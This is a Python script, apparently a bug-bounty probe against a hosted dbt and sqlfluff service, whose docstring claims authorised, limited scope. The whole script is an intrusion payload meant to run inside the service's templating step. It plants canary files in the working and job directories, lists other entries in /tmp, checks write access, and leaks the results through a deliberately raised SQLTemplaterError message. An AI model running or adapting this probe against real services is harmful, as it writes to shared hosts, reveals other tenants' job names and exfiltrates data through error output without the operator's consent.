MARKER = 'A145F9_R2_1B2047C13A46'
"""Authorised security-research probe (Bugcrowd dbtlabs-mbb-og1).
Reads process-local directory NAMES, and the content of ONE file whose
name this researcher chose and planted. No environment, no network, no
instance metadata, no foreign file content."""
import json, os, time
from sqlfluff.core.errors import SQLTemplaterError
CANARY = 'CLEAVE_CANARY_1b2047c13a46.txt'
out = {}

def _mine():
    parts = os.getcwd().rstrip('/').split('/')
    return parts[-2] if len(parts) >= 2 else ''

try:
    cwd = os.getcwd()
    mine = _mine()
    runbase = "/tmp/jobs/" + mine
    body = json.dumps({"owner": "cleave-security-research",
                       "purpose": "authorised co-residency canary, dbt MBB",
                       "planted_by_run": mine, "planted_at": int(time.time())},
                      sort_keys=True)
    planted = []
    for tag, d in (("target", cwd), ("rundir", runbase)):
        try:
            with open(d + "/" + CANARY, "w") as fh:
                fh.write(body + chr(10))
            planted.append([tag, 1, os.path.getsize(d + "/" + CANARY)])
        except Exception as exc:
            planted.append([tag, 0, type(exc).__name__])
    out["planted"] = planted
    out["canary_name"] = CANARY
    names, ndigit = [], 0
    for e in sorted(os.listdir("/tmp")):
        if e.isdigit():
            ndigit += 1
        else:
            names.append(e[:32])
    out["tmp_named"] = names[:25]
    out["tmp_n_named"] = len(names)
    out["tmp_n_digit"] = ndigit
    out["jobs_writable"] = os.access("/tmp/jobs", os.W_OK)
    out["tmp_writable"] = os.access("/tmp", os.W_OK)
except Exception as exc:
    out["err"] = type(exc).__name__ + ":" + str(exc)[:160]
raise SQLTemplaterError(MARKER + ' ' + json.dumps(out, sort_keys=True))
